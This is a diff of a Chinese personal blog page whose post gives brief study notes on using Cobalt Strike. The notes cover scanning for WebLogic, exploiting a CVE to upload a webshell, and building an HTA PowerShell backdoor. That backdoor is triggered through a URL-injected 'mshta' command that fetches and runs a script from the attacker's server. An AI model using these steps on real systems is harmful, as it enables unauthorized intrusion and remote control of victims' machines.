@@ -19,18 +19,18 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="信息收集nmap -sT -T4 -p- 地址 weblogic出现端口7001，访问7001，出现Error 404–not found，有weblogic服务，加console，部署console控制台页面，自动跳到登陆页面。 weblogic漏洞探测工具：weblogic scan脚本复制相应CVE编号，百度漏洞复现。此漏洞可以直接执行命令，上传webshell。 反弹shell到cs生成b">
+  <meta name="description" content="​    学了一下cs的简单利用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="cs">
 <meta property="og:url" content="http://example.com/2021/01/25/cs/index.html">
 <meta property="og:site_name" content="WJW&#39;s Blog">
-<meta property="og:description" content="信息收集nmap -sT -T4 -p- 地址 weblogic出现端口7001，访问7001，出现Error 404–not found，有weblogic服务，加console，部署console控制台页面，自动跳到登陆页面。 weblogic漏洞探测工具：weblogic scan脚本复制相应CVE编号，百度漏洞复现。此漏洞可以直接执行命令，上传webshell。 反弹shell到cs生成b">
+<meta property="og:description" content="​    学了一下cs的简单利用">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-01-25T09:00:57.000Z">
-<meta property="article:modified_time" content="2021-05-23T01:34:48.000Z">
+<meta property="article:modified_time" content="2021-07-27T01:51:08.462Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="cs简单利用">
 <meta name="twitter:card" content="summary">
@@ -134,7 +134,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">61</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">60</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -222,16 +222,30 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-23 09:34:48" itemprop="dateModified" datetime="2021-05-23T09:34:48+08:00">2021-05-23</time>
+                <time title="修改时间：2021-07-27 09:51:08" itemprop="dateModified" datetime="2021-07-27T09:51:08+08:00">2021-07-27</time>
               </span>
 
-          <br>
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>599</span>
+              <span>611</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -243,7 +257,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -sT -T4 -p- 地址</code></p>
+        <p>​    学了一下cs的简单利用</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -sT -T4 -p- 地址</code></p>
 <h4 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h4><p>出现端口7001，访问7001，出现Error 404–not found，有weblogic服务，加console，部署console控制台页面，自动跳到登陆页面。</p>
 <h4 id="weblogic漏洞探测"><a href="#weblogic漏洞探测" class="headerlink" title="weblogic漏洞探测"></a>weblogic漏洞探测</h4><p>工具：weblogic scan脚本<br>复制相应CVE编号，百度漏洞复现。<br>此漏洞可以直接执行命令，上传webshell。</p>
 <h4 id="反弹shell到cs"><a href="#反弹shell到cs" class="headerlink" title="反弹shell到cs"></a>反弹shell到cs</h4><h4 id="生成beacon"><a href="#生成beacon" class="headerlink" title="生成beacon"></a>生成beacon</h4><p>添加监听器，生成一个HTML应用程序的后门（选择攻击，生成后门，HTML Application），选择刚刚创建的监听器，powershell。<br>把文件上传到目标机，攻击-&gt;钓鱼攻击-&gt;文件下载，查看是否生成，(攻击-&gt;web服务管理).<br>在URL上输入<code>&amp;cmd=mshta +脚本地址(web服务)</code><br>—-mshta(windows)自带执行脚本命令。<br>进入beacon<br>默认睡眠时间为60s,<br>可以修改为1s。<br><code>shell +命令</code></p>
@@ -271,7 +288,7 @@
   <div id="qr" style="display: none;">
       
       <div style="display: inline-block;">
-        <img src="/images/wechatpay.jpg" alt="WJW 微信支付">
+        <img src="/images/wechatpay.png" alt="WJW 微信支付">
         <p>微信支付</p>
       </div>
       
@@ -412,7 +429,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -460,8 +477,35 @@
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
     <span title="站点总字数">236k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:35</span>
 </div>
+
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
